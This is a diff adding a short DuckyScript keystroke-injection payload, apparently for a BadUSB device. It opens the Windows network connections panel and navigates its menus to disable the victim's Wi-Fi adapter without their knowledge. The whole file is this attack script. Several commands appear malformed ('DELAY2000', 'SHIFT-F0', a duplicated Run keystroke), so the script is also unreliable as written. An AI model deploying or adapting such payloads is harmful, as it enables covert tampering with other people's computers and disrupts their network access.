@@ -1,0 +1,46 @@
+REM Title: windows disable wifi Version 1
+REM Author: youssef mohamed fathy 
+REM Description: disable windoes wifi connection
+REM Target: windows 10 ,11
+
+GUI r
+
+
+DELAY 500
+
+WINDOWS-r
+
+
+STRING ncpa.cpl
+
+
+
+ENTER
+
+DELAY 3000
+
+RIGHTARROW
+
+
+RIGHTARROW
+
+RIGHTARROW
+
+DELAY2000
+
+SHIFT-F0
+
+
+
+DOWNARROW
+
+
+ENTER
+
+DELAY 1000
+
+ALT-F4
+
+ALT-F4
+
+ENTER
